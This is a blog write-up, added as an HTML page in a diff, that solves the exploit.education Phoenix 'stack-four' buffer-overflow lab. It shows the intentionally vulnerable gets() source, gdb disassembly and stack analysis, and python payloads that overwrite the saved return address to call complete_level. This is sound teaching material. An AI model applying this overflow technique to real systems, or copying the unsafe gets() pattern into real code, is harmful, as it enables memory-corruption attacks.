@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || Phoenix: Stack Four</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">Phoenix: Stack Four</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="January 29, 2019">
+      Jan 29
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/exploit">exploit</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/phoenix">phoenix</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/x86">x86</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <p>Goal: Execute the function <code>complete_level</code> by modifying the saved return address, and pointing it to the <code>complete_level()</code> function.</p>
+<p>Source code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
+</span><span class="cm"> * phoenix/stack-four, by https://exploit.education
+</span><span class="cm"> *
+</span><span class="cm"> * The aim is to execute the function complete_level by modifying the
+</span><span class="cm"> * saved return address, and pointing it to the complete_level() function.
+</span><span class="cm"> *
+</span><span class="cm"> * Why were the apple and orange all alone? Because the bananna split.
+</span><span class="cm"> */</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;err.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define BANNER \
+</span><span class="cp">  &#34;Welcome to &#34; LEVELNAME &#34;, brought to you by https:</span><span class="c1">//exploit.education&#34;
+</span><span class="c1"></span>
+<span class="kt">char</span> <span class="o">*</span><span class="nf">gets</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">complete_level</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Congratulations, you&#39;ve finished &#34;</span> <span class="n">LEVELNAME</span> <span class="s">&#34; :-) Well done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">start_level</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">ret</span><span class="p">;</span>
+
+  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+  <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;and will be returning to %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BANNER</span><span class="p">);</span>
+  <span class="n">start_level</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div><p>This is it, the standard buffer overflow /o/, where you take control of the execution flow.</p>
+<p>Test run:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./stack-four
+Welcome to phoenix/stack-four, brought to you by https://exploit.education
+
+and will be returning to 0x804855c
+</code></pre></div><p>This challenge is a bit different from the previous one:</p>
+<ul>
+<li>The vulnerability is still caused by the use of the <code>gets()</code> function.</li>
+<li>The variables <code>buffer</code> and <code>ret</code> are no longer in a <code>struct</code>.</li>
+<li>The code is in a function <code>start_level()</code> called from main.</li>
+<li>Our goal is to call the <code>complete_level()</code> function.</li>
+</ul>
+<p>Let&rsquo;s have a closer look at the <code>ret</code> variable:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"> <span class="kt">void</span> <span class="o">*</span><span class="n">ret</span><span class="p">;</span>  
+ <span class="p">[...]</span>
+ <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></div><p>Some information about <code>__builtin_return_address</code> can be found in the <a href="https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html">documentation of gcc</a>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Built-in Function: void * __builtin_return_address (unsigned int level)
+
+    This function returns the return address of the current function, or of one of its callers. The level argument is number of frames to scan up the call stack. A value of 0 yields the return address of the current function, a value of 1 yields the return address of the caller of the current function, and so forth. When inlining the expected behavior is that the function returns the address of the function that is returned to. To work around this behavior use the noinline function attribute.
+</code></pre></div><p><code>ret</code> is a variable which helps us by printing the return address of the current function. If we run the binary with no argument, we return to <code>0x804855c</code>.</p>
+<p>Let&rsquo;s see where this address is&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ gdb -q ./stack-four
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">gef➤  disas main
+Dump of assembler code for function main:
+   0x08048536 &lt;+0&gt;:	lea    ecx,[esp+0x4]
+   0x0804853a &lt;+4&gt;:	and    esp,0xfffffff0
+   0x0804853d &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
+   0x08048540 &lt;+10&gt;:	push   ebp
+   0x08048541 &lt;+11&gt;:	mov    ebp,esp
+   0x08048543 &lt;+13&gt;:	push   ecx
+   0x08048544 &lt;+14&gt;:	sub    esp,0x4
+   0x08048547 &lt;+17&gt;:	sub    esp,0xc
+   0x0804854a &lt;+20&gt;:	push   0x8048610
+   0x0804854f &lt;+25&gt;:	call   0x8048320 &lt;puts@plt&gt;
+   0x08048554 &lt;+30&gt;:	add    esp,0x10
+   0x08048557 &lt;+33&gt;:	call   0x8048505 &lt;start_level&gt;
+   0x0804855c &lt;+38&gt;:	mov    eax,0x0
+   0x08048561 &lt;+43&gt;:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048564 &lt;+46&gt;:	leave
+   0x08048565 &lt;+47&gt;:	lea    esp,[ecx-0x4]
+   0x08048568 &lt;+50&gt;:	ret
+End of assembler dump.
+
+</code></pre></div><p>So by default, ret points to <code>0x804855c,</code> which is just after the call to <code>start_level()</code>. We need to overwrite the value of <code>ret</code> so that it points to the address to complete_level.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">gef➤  disas start_level
+Dump of assembler code for function start_level:
+   0x08048505 &lt;+0&gt;:	push   ebp
+   0x08048506 &lt;+1&gt;:	mov    ebp,esp
+   0x08048508 &lt;+3&gt;:	sub    esp,0x58
+   0x0804850b &lt;+6&gt;:	sub    esp,0xc
+   0x0804850e &lt;+9&gt;:	lea    eax,[ebp-0x4c]
+   0x08048511 &lt;+12&gt;:	push   eax
+   0x08048512 &lt;+13&gt;:	call   0x8048310 &lt;gets@plt&gt;
+   0x08048517 &lt;+18&gt;:	add    esp,0x10
+   0x0804851a &lt;+21&gt;:	mov    eax,DWORD PTR [ebp+0x4]
+   0x0804851d &lt;+24&gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x08048520 &lt;+27&gt;:	sub    esp,0x8
+   0x08048523 &lt;+30&gt;:	push   DWORD PTR [ebp-0xc]
+   0x08048526 &lt;+33&gt;:	push   0x80485f3
+   0x0804852b &lt;+38&gt;:	call   0x8048300 &lt;printf@plt&gt;
+   0x08048530 &lt;+43&gt;:	add    esp,0x10
+   0x08048533 &lt;+46&gt;:	nop
+   0x08048534 &lt;+47&gt;:	leave
+   0x08048535 &lt;+48&gt;:	ret
+End of assembler dump.
+
+</code></pre></div><p>Note that we aren&rsquo;t in main() anymore but in start_level(). Let&rsquo;s draw a stack:</p>
+<table>
+<thead>
+<tr>
+<th>Assembly</th>
+<th>Stack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x08048554 &lt;+30&gt;:	add    esp,0x10</td>
+<td><img src="stack_four_stack_0.png" alt=""></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Assembly</th>
+<th>Stack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x08048557 &lt;+33&gt;:	call   0x8048505 &lt;start_level&gt;<!-- raw HTML omitted -->0x08048505 &lt;+0&gt;:	push   ebp<!-- raw HTML omitted --> 0x08048506 &lt;+1&gt;:	mov    ebp,esp</td>
+<td><img src="stack_four_stack_1.png" alt=""></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Assembly</th>
+<th>Stack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x08048508 &lt;+3&gt;:	sub    esp,0x58</td>
+<td><img src="stack_four_stack_2.png" alt=""></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Assembly</th>
+<th>Stack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x0804850b &lt;+6&gt;:	sub    esp,0xc</td>
+<td><img src="stack_four_stack_3.png" alt=""></td>
+</tr>
+</tbody>
+</table>
+<p>From the usage of the variable, we can guess where are <code>buffer</code> and <code>ret</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">   0x0804850e &lt;+9&gt;:	lea    eax,[ebp-0x4c]
+   0x08048511 &lt;+12&gt;:	push   eax
+   0x08048512 &lt;+13&gt;:	call   0x8048310 &lt;gets@plt&gt;
+</code></pre></div><p><code>[ebp-0x4c]</code> is a parameter of <code>gets()</code> so it&rsquo;s <code>buffer</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">   0x0804851a &lt;+21&gt;:	mov    eax,DWORD PTR [ebp+0x4]
+   0x0804851d &lt;+24&gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x08048520 &lt;+27&gt;:	sub    esp,0x8
+   0x08048523 &lt;+30&gt;:	push   DWORD PTR [ebp-0xc]
+   0x08048526 &lt;+33&gt;:	push   0x80485f3
+   0x0804852b &lt;+38&gt;:	call   0x8048300 &lt;printf@plt&gt;
+</code></pre></div><p>The value of referenced at <code>[ebp+0x4]</code> is copied to a buffer located at <code>[ebp-0xc]</code> and then used by  <code>printf()</code>. So <code>[ebp-0xc]</code> should point to our <code>ret</code> variable, which fetches the return address at <code>[ebp+0x4]</code>.The final stack looks like this:</p>
+<p><img src="stack_four_stack_4.png" alt=""></p>
+<p>So we need to overwrite:</p>
+<ul>
+<li>buffer, which is at EBP-4C, 76 bytes</li>
+<li>saved EBP, 4 bytes</li>
+<li>return address, 4 bytes</li>
+</ul>
+<p>In total, 84 bytes, let&rsquo;s verify this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ python -c <span class="s2">&#34;print(&#39;A&#39;*80 + &#39;B&#39;*4)&#34;</span> <span class="p">|</span> ./stack-four
+Welcome to phoenix/stack-four, brought to you by https://exploit.education
+and will be returning to 0x42424242
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+
+</code></pre></div><p>The return address is <code>0x42424242</code>, which means we now control the return address.</p>
+<!-- raw HTML omitted -->
+<p>Let&rsquo;s look for the address of <code>complete_level()</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nm stack-four <span class="p">|</span> grep complete_level
+080484e5 T complete_level
+</code></pre></div><p>Replace our BBB with the address of  <code>complete_level()</code> and voila:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ python -c <span class="s2">&#34;print(&#39;A&#39;*80 + &#39;\xe5\x84\x04\x08&#39;)&#34;</span> <span class="p">|</span> ./stack-four
+Welcome to phoenix/stack-four, brought to you by https://exploit.education
+and will be returning to 0x80484e5
+Congratulations, you<span class="err">&#39;</span>ve finished phoenix/stack-four :-<span class="o">)</span> Well <span class="k">done</span>!
+</code></pre></div>
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents"></nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
